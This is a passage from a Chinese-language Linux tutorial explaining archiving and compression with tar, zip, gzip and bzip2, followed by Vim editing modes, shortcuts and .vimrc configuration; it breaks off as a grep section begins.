由于计算机处理的信息是以二进制的形式表示的，因此，压缩软件就是把二进制信息中相同的字符串以特殊字符标记，只要通过合理的数学计算，文件的体积就能够被大大压缩。把一个或者多个文件用压缩软件进行压缩，形成一个文件压缩包，既可以节省存储空间，有方便在网络上传送。 对文件进行压缩，很可能损坏文件中的内容，因此，压缩又可以分为有损压缩和无损压缩。无损压缩很好理解，指的是压缩数据必须准确无误；有损压缩指的是即便丢失个别的数据，对文件也不会造成太大的影响。有损压缩广泛应用于动画、声音和图像文件中，典型代表就是影碟文件格式 mpeg、音乐文件格式 mp3 以及图像文件格式 jpg 采用压缩工具对文件进行压缩，生成的文件称为压缩包，该文件的体积通常只有原文件的一半甚至更小。需要注意的是，压缩包中的数据无法直接使用，使用前需要利用压缩工具将文件数据还原，此过程又称解压缩 Linux 下，常用归档命令有 2 个，分别是 tar 和 dd（相对而言，tar 的使用更为广泛）；常用的压缩命令有很多，比如 gzip、zip、bzip2 tar打包命令详解 最常用的归档（打包）命令就是 tar，该命令可以将许多文件一起保存到一个单独的磁带或磁盘中进行归档。不仅如此，该命令还可以从归档文件中还原所需文件，也就是打包的反过程，称为解打包。 使用 tar 命令归档的包通常称为 tar 包（tar 包文件都是以“.tar”结尾的）。 当 tar 命令用于打包操作时，该命令的基本格式为： [root@localhost ~]#tar [选项] 源文件或目录 此命令常用的选项及各自的含义如表所示 选项 含义 -c 将多个文件或目录进行打包。 -A 追加 tar 文件到归档文件。 -f 包名 指定包的文件名。包的扩展名是用来给管理员识别格式的，所以一定要正确指定扩展名； -v 显示打包文件过程； 需要注意的是，在使用 tar 命令指定选项时可以不在选项前面输入“-”。例如，使用“cvf”选项和 “-cvf”起到的作用一样。 tar -cvf anaconda-ks.cfg.tar anaconda-ks.cfg #把anacondehks.cfg打包为 anacondehks.cfg.tar文件 选项 \"-cvf\" 一般是习惯用法，记住打包时需要指定打包之后的文件名，而且要用 \".tar\" 作为扩展名。打包目录也是如此： ll -d test/ drwxr-xr-x 2 root root 4096 6月 17 21:09 test/ #test是我们之前的测试目录 tar -cvf test.tar test/ test/ test/test3 test/test2 test/test1 #把目录打包为test.tar文件 # tar命令也可以打包多个文件或目录，只要用空格分开即可。例如: tar -cvf ana.tar anaconda-ks.cfg /tmp/ #把anaconda-ks.cfg文件和/tmp目录打包成ana.tar文件包 打包并压缩目录。 首先声明一点，压缩命令不能直接压缩目录，必须先用 tar 命令将目录打包，然后才能用 gzip 命令或 bzip2 命令对打包文件进行压缩 ll -d test test.tar drwxr-xr-x 2 root root 4096 6月 17 21:09 test -rw-r--r-- 1 root root 10240 6月 18 01:06 test.tar #我们之前已经把test目录打包成test.tar文件 gzip test.tar ll test.tar.gz -rw-r--r-- 1 root root 176 6月 18 01:06 test.tar.gz #gzip命令会把test.tar压缩成test.tar.gz tar命令做解打包操作 当 tar 命令用于对 tar 包做解打包操作时，该命令的基本格式如下： [root@localhost ~]#tar [选项] 压缩包 当用于解打包时，常用的选项与含义如表 2 所示。 选项 含义 -x 对 tar 包做解打包操作。 -f 指定要解压的 tar 包的包名。 -t 只查看 tar 包中有哪些文件或目录，不对 tar 包做解打包操作。 -C 目录 指定解打包位置。 -v 显示解打包的具体过程。 其实解打包和打包相比，只是把打包选项 \"-cvf\" 更换为 \"-xvf\" tar -xvf anaconda-ks.cfg. tar #解打包到当前目录下 如果使用 \"-xvf\" 选项，则会把包中的文件解压到当前目录下。如果想要指定解压位置，则需要使用 \"-C(大写)\" 选项。例如： tar -xvf test.tar -C /tmp #把文件包test.tar解打包到/tmp/目录下 如果只想查看文件包中有哪些文件，则可以把解打包选项 \"-x\" 更换为测试选项 \"-t\"。例如： tar -tvf test.tar drwxr-xr-x root/root 0 2016-06-17 21:09 test/ -rw-r-r- root/root 0 2016-06-17 17:51 test/test3 -rw-r-r- root/root 0 2016-06-17 17:51 test/test2 -rw-r-r- root/root 0 2016-06-17 17:51 test/test1 #会用长格式显示test.tar文件包中文件的详细信息 tar命令做打包压缩（解压缩解打包）操作 你可能会觉得 Linux 实在太不智能了，一个打包压缩，居然还要先打包成 \".tar\" 格式，再压缩成 \".tar.gz\" 或 \".tar.bz2\" 格式。其实 tar 命令是可以同时打包压缩的，前面的讲解之所打包和压缩分开，是为了让大家了解在 Linux 中打包和压缩的不同。 当 tar 命令同时做打包压缩的操作时，其基本格式如下 tar [选项] 压缩包 源文件或目录 此处常用的选项有以下 2 个，分别是： -z：压缩和解压缩 \".tar.gz\" 格式； -j：压缩和解压缩 \".tar.bz2\"格式。 压缩与解压缩 \".tar.gz\"格式。 tar -zcvf tmp.tar.gz /tmp/ #把/tmp/目录直接打包压缩为\".tar.gz\"格式，通过\"-z\"来识别格式，\"-cvf\"和打包选项一致 解压缩也只是在解打包选项 \"-xvf\" 前面加了一个 \"-z\" 选项 tar -zxvf tmp.tar.gz #解压缩与解打包\".tar.gz\"格式 前面讲的选项 \"-C\" 用于指定解压位置、\"-t\" 用于查看压缩包内容，在这里同样适用。 压缩与解压缩 \".tar.bz2\" 格式。 和\".tar.gz\"格式唯一的不同就是\"-zcvf\"选项换成了 \"-jcvf\"，如下所示： tar -jcvf tmp.tar.bz2 /tmp/ #打包压缩为\".tar.bz2\"格式，注意压缩包文件名 tar -jxvf tmp.tar.bz2 #解压缩与解打包\".tar.bz2\"格式 把文件直接压缩成\".tar.gz\"和\".tar.bz2\"格式，才是 Linux 中最常用的压缩方式 tar 命令最初被用来在磁带上创建备份，现在可以在任何设备上创建备份。利用 tar 命令可以把一大堆的文件和目录打包成一个文件，这对于备份文件或是将几个文件组合成为一个文件进行网络传输是非常有用的 Linux zip命令：压缩文件或目录 我们经常会在 Windows 系统上使用 “.zip”格式压缩文件，其实“.zip”格式文件是 Windows 和 Linux 系统都通用的压缩文件类型，属于几种主流的压缩格式（zip、rar等）之一，是一种相当简单的分别压缩每个文件的存储格式 本节要讲的 zip 命令，类似于 Windows 系统中的 winzip 压缩程序，其基本格式如下： zip [选项] 压缩包名 源文件或源目录列表 注意，zip 压缩命令需要手工指定压缩之后的压缩包名，注意写清楚扩展名，以便解压缩时使用。 该命令常用的几个选项及各自的含义如表所示。 选项 含义 -r 递归压缩目录，及将制定目录下的所有文件以及子目录全部压缩。 -m 将文件压缩之后，删除原始文件，相当于把文件移到压缩文件中。 -v 显示详细的压缩过程信息。 -q 在压缩的时候不显示命令的执行过程。 -压缩级别 压缩级别是从 1~9 的数字，-1 代表压缩速度更快，-9 代表压缩效果更好。 -u 更新压缩文件，即往压缩文件中添加新文件。 zip 命令的基本使用 [root@localhost ~]# zip ana.zip anaconda-ks.cfg adding: anaconda-ks.cfg (deflated 37%) #压缩 [root@localhost ~]# ll ana.zip -rw-r--r-- 1 root root 935 6月 1716:00 ana.zip #压缩文件生成 不仅如此，所有的压缩命令都可以同时压缩多个文件，例如： [root@localhost ~]# zip test.zip install.log install.log.syslog adding: install.log (deflated 72%) adding: install.log.syslog (deflated 85%) #同时压缩多个文件到test.zip压缩包中 [root@localhost ~]#ll test.zip -rw-r--r-- 1 root root 8368 6月 1716:03 test.zip #压缩文件生成 使用 zip 命令压缩目录，需要使用“-r”选项，例如： [root@localhost ~]# mkdir dir1 #建立测试目录 [root@localhost ~]# zip -r dir1.zip dir1 adding: dir1/(stored 0%) #压缩目录 [root@localhost ~]# ls -dl dir1.zip -rw-r--r-- 1 root root 160 6月 1716:22 dir1.zip #压缩文件生成 Linux unzip命令：解压zip文件 unzip 命令可以查看和解压缩 zip 文件。该命令的基本格式如下： [root@localhost ~]# unzip [选项] 压缩包名 此命令常用的选项以及各自的含义如表所示。 选项 含义 -d 目录名 将压缩文件解压到指定目录下。 -n 解压时并不覆盖已经存在的文件。 -o 解压时覆盖已经存在的文件，并且无需用户确认。 -v 查看压缩文件的详细信息，包括压缩文件中包含的文件大小、文件名以及压缩比等，但并不做解压操作。 -t 测试压缩文件有无损坏，但并不解压。 -x 文件列表 解压文件，但不包含文件列表中指定的文件。 不论是文件压缩包，还是目录压缩包，都可以直接解压缩 [root@localhost ~]# unzip dir1.zip Archive: dir1.zip creating: dirl/ #解压缩 使用 -d 选项手动指定解压缩位置，例如： [root@localhost ~]# unzip -d /tmp/ ana.zip Archive: ana.zip inflating: /tmp/anaconda-ks.cfg #把压缩包解压到指定位置 Linux gzip命令：压缩文件或目录 gzip 是 Linux 系统中经常用来对文件进行压缩和解压缩的命令，通过此命令压缩得到的新文件，其扩展名通常标记为“.gz”。 再强调一下，gzip 命令只能用来压缩文件，不能压缩目录，即便指定了目录，也只能压缩目录内的所有文件。 gzip 命令的基本格式如下： [root@localhost ~]# gzip [选项] 源文件 命令中的源文件，当进行压缩操作时，指的是普通文件；当进行解压缩操作时，指的是压缩文件。该命令常用的选项及含义如表 1 所示。 选项 含义 -c 将压缩数据输出到标准输出中，并保留源文件。 -d 对压缩文件进行解压缩。 -r 递归压缩指定目录下以及子目录下的所有文件。 -v 对于每个压缩和解压缩的文件，显示相应的文件名和压缩比。 -l 对每一个压缩文件，显示以下字段：压缩文件的大小；未压缩文件的大小；压缩比；未压缩文件的名称。 -数字 用于指定压缩等级，-1 压缩等级最低，压缩比最差；-9 压缩比最高。默认压缩比是 -6。 【例 1】基本压缩。 gzip 压缩命令非常简单，甚至不需要指定压缩之后的压缩包名，只需指定源文件名即可。我们来试试： [root@localhost ~]# gzip install.log #压缩instal.log 文件 [root@localhost ~]# ls anaconda-ks.cfg install.log.gz install.log.syslog #压缩文件生成，但是源文件也消失了 【例 2】保留源文件压缩。 在使用 gzip 命令压缩文件时，源文件会消失，从而生成压缩文件。这时有些人会有强迫症，就逼问笔者：能不能在压缩文件的时候，不让源文件消失？好吧，也是可以的，不过很别扭。 [root@localhost ~]# gzip -c anaconda-ks.cfg >anaconda-ks.cfg.gz #使用-c选项，但是不让压缩数据输出到屏幕上，而是重定向到压缩文件中，这样可以缩文件的同时不删除源文件 [root@localhost ~]# ls anaconda-ks.cfg anaconda-ks.cfg.gz install.log.gz install.log.syslog #可以看到压缩文件和源文件都存在 【例 3】 压缩目录。 我们可能会想当然地认为 gzip 命令可以压缩目录。 我们来试试： [root@localhost ~]# mkdir test [root@localhost ~]# touch test/test1 [root@localhost ~]# touch test/test2 [root@localhost ~]# touch test/test3 #建立测试目录，并在里面建立几个测试文件 [root@localhost ~]# gzip -r test/ #压缩目录，并没有报错 [root@localhost ~]# ls anaconda-ks.cfg anaconda-ks.cfg.gz install.log.gz install.log.syslog test #但是查看发现test目录依然存在，并没有变为压缩文件 [root@localhost ~]# ls test/ testl .gz test2.gz test3.gz #原来gzip命令不会打包目录，而是把目录下所有的子文件分别压缩 在 Linux 中，打包和压缩是分开处理的。而 gzip 命令只会压缩，不能打包，所以才会出现没有打包目录，而只把目录下的文件进行压缩的情况。 Linux gunzip命令：解压缩文件或目录 gunzip 是一个使用广泛的解压缩命令，它用于解压被 gzip 压缩过的文件（扩展名为 .gz）。 对于解压被 gzip 压缩过的文件，还可以使用 gzip 自己，即 gzip -d 压缩包。 gunzip 命令的基本格式为： [root@localhost ~]# gunzip [选项] 文件 该命令常用的选项及含义如表所示。 选项 含义 -r 递归处理，解压缩指定目录下以及子目录下的所有文件。 -c 把解压缩后的文件输出到标准输出设备。 -f 强制解压缩文件，不理会文件是否已存在等情况。 -l 列出压缩文件内容。 -v 显示命令执行过程。 -t 测试压缩文件是否正常，但不对其做解压缩操作。 【例 1】直接解压缩文件。 [root@localhost ~]# gunzip install.log.gz 当然，\"gunzip -r\"依然只会解压缩目录下的文件，而不会解打包。要想解压缩\".gz\"格式，还可以使用 \"gzip -d\"命令，例如： [root@localhost ~]# gzip -d anaconda-ks.cfg.gz 【例 2】要解压缩目录下的内容，则需使用 \"-r\" 选项，例如： [root@localhost ~]# gunzip -r test/ 注意，如果我们压缩的是一个纯文本文件，则可以直接使用 zcat 命令在不解压缩的情况下查看这个文本文件中的内容。例如： [root@localhost ~]# zcat anaconda-ks.cfg.gz Linux bzip2命令：压缩文件（.bz2格式） bzip2 命令同 gzip 命令类似，只能对文件进行压缩（或解压缩），对于目录只能压缩（或解压缩）该目录及子目录下的所有文件。当执行压缩任务完成后，会生成一个以“.bz2”为后缀的压缩包 \".bz2\"格式是 Linux 的另一种压缩格式，从理论上来讲，\".bz2\"格式的算法更先进、压缩比更好；而 \".gz\"格式相对来讲的时间更快。 bzip2 命令的基本格式如下： [root@localhost ~]# bzip2 [选项] 源文件 源文件指的要压缩或解压缩的文件，该命令常用的选项及各自的含义如表 1 所示。 选项 含义 -d 执行解压缩，此时该选项后的源文件应为标记有 .bz2 后缀的压缩包文件。 -k bzip2 在压缩或解压缩任务完成后，会删除原始文件，若要保留原始文件，可使用此选项。 -f bzip2 在压缩或解压缩时，若输出文件与现有文件同名，默认不会覆盖现有文件，若使用此选项，则会强制覆盖现有文件。 -t 测试压缩包文件的完整性。 -v 压缩或解压缩文件时，显示详细信息。 -数字 这个参数和 gzip 命令的作用一样，用于指定压缩等级，-1 压缩等级最低，压缩比最差；-9 压缩比最高 注意，gzip 只是不会打包目录，但是如果使用“-r”选项，则可以分别压缩目录下的每个文件；而 bzip2 命令则根本不支持压缩目录，也没有“-r”选项。 【例 1】直接压缩文件。 [root@localhost ~]# bzip2 anaconda-ks.cfg #压缩成\".bz2\"格式 此压缩命令会在压缩的同时删除源文件。 【例 2】压缩的同时保留源文件。 [root@localhost ~]# bzip2 -k install.log.syslog #压缩 [root@localhost ~]# ls anaconda-ks.cfg.bz2 install.loginstalLlogsyslog install.logsyslogbz2 #压缩文件和源文件都存在 Linux bunzip2命令：bz2格式的解压缩命令 要解压“.bz2”格式的压缩包文件，除了使用“bzip2 -d 压缩包名”命令外，还可以使用 bunzip2 命令。 bunzip2 命令的使用和 gunzip 命令大致相同，bunzip2 命令只能用于解压文件，即便解压目录，也是解压该目录以及所含子目录下的所有文件。 bunzip2 命令的基本格式为： [root@localhost ~]# bunzip2 [选项] 源文件 此命令常用的选项以及各自的含义，如表 1 所示。 选项 含义 -k 解压缩后，默认会删除原来的压缩文件。若要保留压缩文件，需使用此参数。 -f 解压缩时，若输出的文件与现有文件同名时，默认不会覆盖现有的文件。若要覆盖，可使用此选项。 -v 显示命令执行过程。 -L 列出压缩文件内容。 先试试使用 bunzip2 命令来进行解压缩，例如： [root@localhost ~]# bunzip2 anaconda-ks.cfg.bz2 \".bz2\" 格式也可以使用 \"bzip2 -d 压缩包\" 命令来进行解压缩，例如： [root@localhost ~]# bzip2 -d install.log.syslog.bz2 和 \".gz\" 格式一样，\".bz2\" 格式压缩的纯文本文件也可以不解压缩直接查看，使用的命令是 bzcat。例如： [root@localhost ~]# bzcat install.log.syslog.bz2 Vim 文本编辑器 Vim 编辑文件时，存在 3 种工作模式，分别是命令模式、输入模式和编辑模式，这 3 种工作模式可随意切换，如图 1 所示 Vim的命令模式 使用 Vim 编辑文件时，默认处于命令模式。此模式下，可使用方向键（上、下、左、右键）或 k、j、h、i 移动光标的位置，还可以对文件内容进行复制、粘贴、替换、删除等操作。 图 2 所示是在 CentOS 6.x 系统中 Vim 处于命令模式的状态示意图。 Vim的输入模式 在输入模式下，Vim 可以对文件执行写操作，类似于在 Windows 系统的文档中输入内容。 使 Vim 进行输入模式的方式是在命令模式状态下输入 i、I、a、A、o、O 等插入命令（各指令的具体功能如表 3 所示），当编辑文件完成后按 Esc 键即可返回命令模式。 快捷键 功能描述 i 在当前光标所在位置插入随后输入的文本，光标后的文本相应向右移动 I 在光标所在行的行首插入随后输入的文本，行首是该行的第一个非空白字符，相当于光标移动到行首执行 i 命令 o 在光标所在行的下面插入新的一行。光标停在空行首，等待输入文本 O 在光标所在行的上面插入新的一行。光标停在空行的行首，等待输入文本 a 在当前光标所在位置之后插入随后输入的文本 A 在光标所在行的行尾插入随后输入的文本，相当于光标移动到行尾再执行a命令 图 4 所示即为 Vim 处于输入模式状态下的示意图。 Vim 的编辑模式 编辑模式用于对文件中的指定内容执行保存、查找或替换等操作。 使 Vim 切换到编辑模式的方法是在命令模式状态下按“：”键，此时 Vim 窗口的左下方出现一个“：”符号，这是就可以输入相关指令进行操作了。 指令执行后 Vim 会自动返回命令模式。如想直接返回命令模式，按 Esc 即可。 图 4 所示为 Vim 进入编辑模式后的状态。 Linux Vim基本操作（文件的打开和编辑）完全攻略（有图有真相） 我们还可以利用下表中打开文件的命令格式，针对特定情形使用适当的打开方式，可以大大提高我们的效率。 Vi 使用的选项 说 明 vim filename 打开或新建一个文件，并将光标置于第一行的首部 vim -r filename 恢复上次 vim 打开时崩溃的文件 vim -R filename 把指定的文件以只读方式放入 Vim 编辑器中 vim + filename 打开文件，并将光标置于最后一行的首部 vi +n filename 打开文件，并将光标置于第 n 行的首部 vi +/pattern filename 打幵文件，并将光标置于第一个与 pattern 匹配的位置 vi -c command filename 在对文件进行编辑前，先执行指定的命令 同样，Vim 提供了大量的编辑快捷键，主要可分为以下几类。 Vim 插入文本 从命令模式进入输入模式进行编辑，可以按下 I、i、O、o、A、a 等键来完成，使用不同的键，光标所处的位置不同，如表 3 所示。 快捷键 功能描述 i 在当前光标所在位置插入随后输入的文本，光标后的文本相应向右移动 I 在光标所在行的行首插入随后输入的文本，行首是该行的第一个非空白字符，相当于光标移动到行首执行 i 命令 o 在光标所在行的下面插入新的一行。光标停在空行首，等待输入文本 O（大写） 在光标所在行的上面插入新的一行。光标停在空行的行首，等待输入文本 a 在当前光标所在位置之后插入随后输入的文本 A 在光标所在行的行尾插入随后输入的文本，相当于光标移动到行尾再执行 a 命令 Vim 查找文本 快捷键 功能描述 /abc 从光标所在位置向前查找字符串 abc /^abc 查找以 abc 为行首的行 /abc$ 查找以 abc 为行尾的行 ?abc 从光标所在为主向后查找字符串 abc n 向同一方向重复上次的查找指令 N 向相反方向重复上次的查找指定 在查找过程中需要注意的是，要查找的字符串是严格区分大小写的，如查找 \"shenchao\" 和 \"ShenChao\" 会得到不同的结果。 如果想忽略大小写，则输入命令 \":set ic\"；调整回来输入\":set noic\"。 如果在字符串中出现特殊符号，则需要加上转义字符 \"\\\"。常见的特殊符号有 \\、*、?、$ 等。如果出现这些字符，例如，要查找字符串 \"10$\"，则需要在命令模式中输入 \"/10$\"。 Vim 替换文本 快捷键 功能描述 r 替换光标所在位置的字符 R 从光标所在位置开始替换字符，其输入内容会覆盖掉后面等长的文本内容，按“Esc”可以结束 :s/a1/a2/g 将当前光标所在行中的所有 a1 用 a2 替换 :n1,n2s/a1/a2/g 将文件中 n1 到 n2 行中所有 a1 都用 a2 替换 :g/a1/a2/g(不支持) 将文件中所有的 a1 都用 a2 替换 例如，要将某文件中所有的 \"root\" 替换为 \"liudehua\"，则有两种输入命令，分别为： :1, $s/root/liudehua/g 或 :%s/root/liudehua/g 上述命令是在编辑模式下操作的，表示的是从第一行到最后一行，即全文查找 \"root\"，然后替换成 \"liudehua\"。如果刚才的命令变成 :10,20 s/root/liudehua/g，则只替换从第 10 行到第 20 行的 \"root\"。 Vim删除文本 快捷键 功能描述 x 删除光标所在位置的字符 dd 删除光标所在行 ndd 删除当前行（包括此行）后 n 行文本 dG 删除光标所在行一直到文件末尾的所有内容 D 删除光标位置到行尾的内容 :a1,a2d 函数从 a1 行到 a2 行的文本内容 注意，被删除的内容并没有真正删除，都放在了剪贴板中。将光标移动到指定位置处，按下 \"p\" 键，就可以将刚才删除的内容又粘贴到此处。 Vim复制和粘贴文本 快捷键 功能描述 p 将剪贴板中的内容粘贴到光标后 P（大写） 将剪贴板中的内容粘贴到光标前 y 复制已选中的文本到剪贴板 yy 将光标所在行复制到剪贴板，此命令前可以加数字 n，可复制多行 yw 将光标位置的单词复制到剪贴板 Vim其他常用快捷键 某些情况下，可能需要把两行进行连接。比如说，下面的文件中有两行文本，现在需要将其合并成一行（实际上就是将两行间的换行符去掉）。可以直接在命令模式中按下 \"J\" 键，按下前后如图 10 所示。 如果不小心误删除了文件内容，则可以通过 \"u\" 键来撤销刚才执行的命令。如果要撤销刚才的多次操作，可以多按几次 \"u\" 键。 Vim 保存退出文本 Vim 的保存和退出是在编辑模式中进行的，其常用命令如下表所示 命令 功能描述 :wq 保存并退出 Vim 编辑器 :wq! 保存并强制退出 Vim 编辑器 :q 不保存就退出 Vim 编辑器 :q! 不保存，且强制退出 Vim 编辑器 :w 保存但是不退出 Vim 编辑器 :w! 强制保存文本 :w filename 另存到 filename 文件 :x！ 保存文本，并退出 Vim 编辑器，更通用的一个 vim 命令 ZZ 直接退出 Vim 编辑器 需要注意的是，\"w!\" 和 \"wq!\" 等类似的指令，通常用于对文件没有写权限的时候（显示 readonly，如图 12 所示），但如果你是文件的所有者或者 root 用户，就可以强制执行。 Vim移动光标快捷键汇总 Vim 文本编辑器中，最简单的移动光标的方式是使用方向键，但这种方式的效率太低，更高效的方式使用快捷键。 Vim 移动光标常用的快捷键及其功能如下面各表所示，需要注意的是，表中所有的快捷键都在命令模式（默认状态）下直接使用。 方向键 快捷键 功能描述 h 光标向左移动一位 j 光标向下移动一行（以回车为换行符），也就是光标向下移动 k 光标向上移动一行（也就是向上移动） l 光标向右移动一位 最初使用，大家可能觉得比较别扭，但熟能生巧，使用此方式移动光标同样能够提高编辑速度。 光标以单词为单位移动 快捷键 功能描述 w 或 W 光标移动至下一个单词的单词首 b 或 B 光标移动至上一个单词的单词首 e 或 E 光标移动至下一个单词的单词尾 nw 或 nW n 为数字，表示光标向右移动 n 个单词 nb 或 nB n 为数字，表示光标向左移动 n 个单词 光标移动至行首或行尾 快捷键 功能描述 0 或 ^ 光标移动至当前行的行首 $ 光标移动至当前行的行尾 n$ 光标移动至当前行只有 n 行的行尾，n为数字 光标移动至指定字符 一行中，如果需要将光标移动到当前行的某个特点字符，则可以使用表 4 中的快捷键。 快捷键 功能描述 fx 光标移动至当前行中下一个 x 字符处 Fx 光标移动至当前行中下一个 x 字符处 光标移动到指定行 快捷键 功能描述 gg 光标移动到文件开头 G 光标移动至文件末尾 nG 光标移动到第 n 行，n 为数字 :n 编辑模式下使用的快捷键，可以将光标快速定义到指定行的行首 光标移动到匹配的括号处 程序员在编辑程序时，经常会为将光标移动到与一个 \"(\" 匹配的 \")\" （对于 [] 和 {} 也是一样的）处而感到头疼。Vim 里面提供了一个非常方便地査找匹配括号的命令，这就是 \"%\"。 比如，在 /etc/init.d/sshd 脚本文件中（最好还是复制后练习，小心驶得万年船），想迅速地将光标定位到与第 49 行的 \"{\" 相对应的 \"}\" 处，则可以将光标先定位在 \"{\" 处，然后再使用 \"％\" 命令，使之定位在 \"}\" 处，如图 6 所示。 Linux Vim撤销和恢复撤销快捷键用法详解 使用 Vim 编辑文件内容时，经常会有如下 2 种需求： 对文件内容做了修改之后，却发现整个修改过程是错误或者没有必要的，想将文件恢复到修改之前的样子。 将文件内容恢复之后，经过仔细考虑，又感觉还是刚才修改过的内容更好，想撤销之前做的恢复操作。 基于这 2 种需求，Vim 编辑器提供了撤销和恢复撤销的命令，如表 1 所示。 快捷键 功能 u（小写） undo 的第 1 个字母，功能是撤销最近一次对文本做的修改操作。 Ctrl+R Redo 的第 1 个字母，功能是恢复最近一次所做的撤销操作。 U（大写） 第一次会撤销对一行文本（光标所在行）做过的全部操作，第二次使用该命令会恢复对该行文本做过的所有操作。 注意，以上这 3 种命令都必须在 Vim 编辑器处于命令模式时才能使用 下面通过一个例子来演示以上 3 个命令的具体用法。首先，我们新建一个 demo.txt 文件并打开，键入一行内容，例如： http://c.biancheng.net 然后按“Esc”键，使 Vim 由输入模式转为命令模式，并使用 yy 命令将这一行文本复制到剪贴板中，如此我们就可以在文本任意位置通过键入 p（或大写的 P）命令将复制的内容粘贴到光标所在的位置。 假设我们将光标调整到第一行最后一个字符处，连续按两次 p 命令（粘贴 2 次），则此时文本中的内容变为： http://c.biancheng.net http://c.biancheng.net http://c.biancheng.net 在此基础上，通过 u（小写）命令就可以使文本内容恢复到上一次做粘贴操作之前的样子，其中“上一次”的含义是，恢复操作是可以叠加的，即按一次就会在现有基础上做一次恢复操作。 比如，继续操作 demo.txt 文件，按一次 u，会发现其文本内容变为： http://c.biancheng.net http://c.biancheng.net 再按一次 u，文本内容继续恢复为： http://c.biancheng.net 同样，恢复撤销的操作和撤销操作是相对应的，通过按 Ctrl+R 组合键，可以撤销之前所做的一次恢复操作。例如，继续操作 demo.txt 文件，按一次 Ctrl+R，会发现其文本内容恢复为： http://c.biancheng.net http://c.biancheng.net 再按一次 Ctrl+R，文本内容又恢复为： http://c.biancheng.net http://c.biancheng.net http://c.biancheng.net U（大写）的功能和之前的 2 个命令不同，它的作用是撤销或恢复撤销对光标所在行文本所做的全部操作。比如，我们对 demo.txt 文件内容做如下修改： http://c.biancheng.net http://c.biancheng.net Linux教程 http://c.biancheng.net/linux_tutorial/ 可以看到，这里对第三行文本做了 2 处修改（红色标注部分）。在此基础上，如果在命令模式下键入 U（大写），可以看到，之前对第 3 行所做的 2 处修改，全部被恢复了： http://c.biancheng.net http://c.biancheng.net http://c.biancheng.net 如果此时再键入 U（大写），则又会恢复之前对第 3 行文本做过的全部操作： http://c.biancheng.net http://c.biancheng.net Linux教程 http://c.biancheng.net/linux_tutorial/ Vim多窗口编辑模式 在编辑文件时，有时需要参考另一个文件，如果在两个文件之间进行切换则比较麻烦。可以使用 Vim 同时打开两个文件，每个文件分别占用一个窗口。 例如，在査看 /etc/passwd 时需要参考 /etc/shadow，有两种办法可以实现： 先使用 Vim 打开第一个文件，接着输入命 令 \":sp/etc/shadow\" 水平切分窗口，然后按回车键；如果想垂直切分窗口则可以输入 \":vs/etc/shadow\"; 可以直接执行命令\"vim -o 第一个文件名 第二个文件名\"，也就是 \"vim-o /etc/passwd /etc/shadow\"。 切换到另一个文件窗口，可以按 \"Ctrl+WW\" 快捷键。 如果想将一个文件的内容全部复制到另一个文件中，则可以输入命令 \":r 被复制的文件名\"，即可将导入文件的全部内容复制到当前光标所在行下面。 Vim显示行号 在使用 Vim 进行编辑的过程中，经常会遇到需要同时对连续几行进行操作的情况，这时如果每行都有行号提示，就会非常方便。 在命令模式下输入\":set nu\"即可显示每一行的行号，如图 1 所示。 如果想要取消行 号，则再次输入\":set nonu\"即可。 如果希望每次打开文件都默认显示行号，则可以编辑 Vim 的配置文件。每次使用 Vim 打开文件时，Vim 都会到当前登录用户的宿主目录（用户配置文件所在地）中读取 .vimrc 文件，此文件可以对 Vim 进行一些默认配置设定。 如果 .vimrc 文件存在，就先读取其中对 Vim 的设置；否则就采取默认配置。在默认情况下，用户宿主目录中是没有此文件的，需要在当前用户的宿主目录中手工建立，如\"vim~/.vimrc\"，\"~\"代表宿主目录，root 的宿主目录为 /root/，普通用户的宿主目录存放在 /home/ 目录下。可以直接使用 Vim 编辑生成此文件，并在此文件中添加一行\"set nu\"，保存并退出，如图 2 所示。 之后此用户登录，每次 Vim 打开文件时，都会默认显示行号。常见的可以写入 .vimrc 文件中的设置参数如表 3 所示 设置参数 含 义 :set nu :set nonu 设置与取消行号。 :syn on :syn off 是否依据语法显示相关的颜色帮助。在Vim中修改相关的配置文件或Shell脚本文件 时（如前面示例的脚本/etc/init.d/sshd)，默认会显示相应的颜色，用来帮助排错。如果觉得颜色产生了干扰，则可以取消此设置 set hlsearch set nohlsearch 设置是否将査找的字符串高亮显示。默认是hlsearch高亮显示 set nobackup set backup 是否保存自动备份文件。默认是nobackup不自动备份。如果设定了:set backup，则会产生“文件名〜”作为备份文件 set ruler set noruler 设置是否显示右下角的状态栏。默认是ruler显示 set showmode set noshowmode 设置是否在左下角显示如“一INSERT--”之类的状态栏。默认是showmode显示 设置参数实在太多了，这里只列举了常见的几个，可以使用\":set all\"命令査看所有的设置参数。这些设置参数都可以写入 .vimrc 配置文件中，让它们永久生效，也可在 Vim 中执行，让它们临时生效。 Vim配置文件（.vimrc）详解 Vim 启动时，会根据配置文件（.vimrc）来设置 Vim，因此我们可以通过此文件来定制适合自己的 Vim。 Vim 配置文件分为系统配置文件和用户配置文件： 系统配置文件位于 Vim 的安装目录（默认路径为 /etc/.vimrc）； 用户配置文件位于主目录 ~/.vimrc，即通过执行 vim ~/.vimrc 命令即可对此配置文件进行合理修改。通常情况下，Vim 用户配置文件需要自己手动创建。 注意，Vim 用户配置文件比系统配置文件的优先级高，换句话说，Vim 启动时，会优先读取 Vim 用户配置文件（位于主目录中的），所以我们只需要修改用户配置文件即可（不建议直接修改系统配置文件）。 Vim 提供的环境配置参数有很多，本节不一一列举，大家可以在 Vim 中输入“：set all”指令来查询，本节仅对常用的几个功能设置做详细介绍。 设置参数 功能描述 set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936 set termencoding=utf-8 set encoding=utf-8 设置编码格式，encoding 选项用于缓存的文本、寄存器、Vim 脚本文件等；fileencoding 选项是 Vim 写入文件时采用的编码类型；termencoding 选项表示输出到终端时采用的编码类型。 set nu set number nu 是 number 的缩写，所以上面两个配置命令是完全等效的，二选一即可。取消行号可使用 set nonu。 set cursorline 突出显示当前行。 set mouse=a set selection=exclusive set selectmode=mouse,key Vim 编辑器里默认是不启用鼠标的，通过此设置即可启动鼠标。 set autoindent 设置自动缩进，即每行的缩进同上一节相同。 set tabstop=4 设置 Tab 键宽度为 4 个空格。 注意，表中各配置参数前面可以添加冒号（：），也可以省略，两种写法都可以。 通过以上方式，可以对用户配置文件（.vimrc）进行编辑，进而实现对 Vim 的永久自定义。 在 Vim 编辑模式中，通过 “:set nu” 命令也可以让 Vim 显示行号，但只是临时有效，下次使用 Vim 编辑文件还是不显示行号。而本节介绍的编辑配置文件设置 Vim 的方式，对 Vim 的设置是永久的。 Linux 三剑客(grep,awak,sed) Linux grep命令详解：查找文件内容 很多时候，我们并不需要列出文件的全部内容，而是从文件中找到包含指定信息的那些行，要实现这个目的，可以使用 grep 命令。 grep 